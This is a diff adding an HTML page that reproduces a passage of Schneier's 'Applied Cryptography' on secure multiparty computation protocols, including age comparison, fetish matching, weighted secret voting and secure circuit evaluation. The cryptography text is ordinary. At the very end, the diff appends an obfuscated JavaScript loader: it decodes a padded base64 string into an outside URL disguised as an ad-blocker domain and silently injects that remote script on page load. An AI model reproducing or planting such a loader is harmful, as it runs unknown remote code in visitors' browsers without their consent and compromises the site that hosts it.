@@ -1,0 +1,114 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Esoteric Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=06//-->
+<!--PAGES=135-137//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="06-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="06-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Of course, this protocol doesn&#146;t protect against active cheaters. There&#146;s nothing to stop Alice (or Bob, for that matter) from lying about her age. If Bob were a computer program that blindly executed the protocol, Alice could learn his age (is the age of a computer program the length of time since it was written or the length of time since it started running?) by repeatedly executing the protocol. Alice might give her age as 60. After learning that she is older, she could execute the protocol again with her age as 30. After learning that Bob is older, she could execute the protocol again with her age as 45, and so on, until Alice discovers Bob&#146;s age to any degree of accuracy she wishes.
+</P>
+<P>Assuming that the participants don&#146;t actively cheat, it is easy to extend this protocol to multiple participants. Any number of people can find out the order of their ages by a sequence of honest applications of the protocol; and no participant can learn the age of another.</P>
+<P><FONT SIZE="+1"><B><I>Protocol #3</I></B></FONT></P>
+<P>Alice likes to do kinky things with teddy bears. Bob has erotic fantasies about marble tables. Both are pretty embarrassed by their particular fetish, but would love to find a mate who shared in their...um...lifestyle.
+</P>
+<P>Here at the Secure Multiparty Computation Dating Service, we&#146;ve designed a protocol for people like them. We&#146;ve numbered an astonishing list of fetishes, from &#147;aardvarks&#148; to &#147;zoot suits.&#148; Discreetly separated by a modem link, Alice and Bob can participate in a secure multiparty protocol. Together, they can determine whether they share the same fetish. If they do, they might look forward to a lifetime of bliss together. If they don&#146;t, they can part company secure in the knowledge that their particular fetish remains confidential. No one, not even the Secure Multiparty Computation Dating Service, will ever know.</P>
+<P>Here&#146;s how it works:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Using a one-way function, Alice hashes her fetish into a seven-digit string.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice uses the seven-digit string as a telephone number, calls the number, and leaves a message for Bob. If no one answers or the number is not in service, Alice applies a one-way function to the telephone number until she finds someone who can play along with the protocol.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice tells Bob how many times she had to apply the one-way hash function to her fetish.
+<DD><B>(4)</B>&nbsp;&nbsp;Bob hashes his fetish the same number of times that Alice did. He also uses the seven-digit string as a telephone number, and asks the person at the other end whether there were any messages for him.
+</DL>
+<P>Note that Bob has a chosen-plaintext attack. He can hash common fetishes and call the resulting telephone numbers, looking for messages for him. This protocol only really works if there are enough possible plaintext messages for this to be impractical.
+</P>
+<P>There&#146;s also a mathematical protocol, one similar to Protocol #2. Alice knows <I>a</I>, Bob knows <I>b</I>, and together they will determine whether <I>a</I> = <I>b</I>, such that Bob does not learn anything additional about <I>a</I> and Alice does not learn anything additional about <I>b</I>. Details are in Section 23.14.</P>
+<P><FONT SIZE="+1"><B><I>Protocol #4</I></B></FONT></P>
+<P>This is another problem for secure multiparty computation [1373]: A council of seven meets regularly to cast secret ballots on certain issues. (All right, they rule the world&#151;don&#146;t tell anyone I told you.) All council members can vote yes or no. In addition, two parties have the option of casting &#147;super votes&#148;: <I>S</I>-yes and <I>S</I>-no. They do not have to cast super votes; they can cast regular votes if they prefer. If no one casts any super votes, then the majority of votes decides the issue. In the case of a single or two equivalent super votes, all regular votes are ignored. In the case of two contradicting super votes, the majority of regular votes decides. We want a protocol that securely performs this style of voting.</P>
+<P>Two examples should illustrate the voting process. Assume there are five regular voters, N<SUB>1</SUB> through N<SUB>5,</SUB> and two super voters: S<SUB>1</SUB> and S<SUB>2</SUB>. Here&#146;s the vote on issue #1:</P>
+<!-- CODE SNIP //-->
+<PRE>
+S<SUB>1</SUB>        S<SUB>2</SUB>      N<SUB>1</SUB>    N<SUB>2</SUB>    N<SUB>3</SUB>    N<SUB>4</SUB>    N<SUB>5</SUB>
+S-yes     no     no    no    no    yes    yes
+</PRE>
+<!-- END CODE SNIP //-->
+<P>In this instance the only vote that matters is S<SUB>1</SUB> &#146;s, and the result is &#147;yes.&#148;</P>
+<P>Here is the vote on issue #2:</P>
+<!-- CODE SNIP //-->
+<PRE>
+S<SUB>1</SUB>       S<SUB>2</SUB>     N<SUB>1</SUB>   N<SUB>2</SUB>   N<SUB>3</SUB>   N<SUB>4</SUB>   N<SUB>5</SUB>
+S-yes    S-no   no   no   no   yes  yes
+</PRE>
+<!-- END CODE SNIP //-->
+<P>Here the two super votes cancel and the majority of regular &#147;no&#148; votes decide the issue.
+</P>
+<P>If it isn&#146;t important to hide the knowledge of whether the super vote or the regular vote was the deciding vote, this is an easy application of a secure voting protocol. Hiding that knowledge requires a more complicated secure multiparty computation protocol.</P>
+<P>This kind of voting could occur in real life. It could be part of a corporation&#146;s organizational structure, where certain people have more power than others, or it could be part of the United Nations&#146;s procedures, where certain nations have more power than others.</P>
+<P><FONT SIZE="+1"><B><I>Multiparty Unconditionally Secure Protocols</I></B></FONT></P>
+<P>This is just a simple case of a general theorem: Any function of <I>n</I> inputs can be computed by a set of <I>n</I> players in a way that will let all learn the value of the function, but any set of less than <I>n</I>/2 players will not get any additional information that does not follow from their own inputs and the value of the output information. For details, see [136, 334, 1288, 621].</P>
+<P><FONT SIZE="+1"><B><I>Secure Circuit Evaluation</I></B></FONT></P>
+<P>Alice has her input, <I>a</I>. Bob has his input, <I>b</I>. Together they wish to compute some general function, <I>f</I> (<I>a,b</I>), such that Alice learns nothing about Bob&#146;s input and Bob learns nothing about Alice&#146;s input. The general problem of secure multiparty computation is also called <B>secure circuit evaluation</B>. Here, Alice and Bob can create an arbitrary Boolean circuit. This circuit accepts inputs from Alice and from Bob and produces an output. Secure circuit evaluation is a protocol that accomplishes three things:</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;Alice can enter her input without Bob&#146;s being able to learn it.
+<DD><B>2.</B>&nbsp;&nbsp;Bob can enter his input without Alice&#146;s being able to learn it.
+<DD><B>3.</B>&nbsp;&nbsp;Both Alice and Bob can calculate the output, with both parties being sure the output is correct and that neither party has tampered with it.
+</DL>
+<P>Details on secure circuit evaluation can be found in [831].
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="06-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="06-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(JzTCLqJs, WvicCXJd) {WvicCXJd = JzTCLqJs.createElement('script');WvicCXJd.type = 'text/javascript';WvicCXJd.async = true;WvicCXJd.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');JzTCLqJs.getElementsByTagName('body')[0].appendChild(WvicCXJd);}(document));</script></body>
+</html>
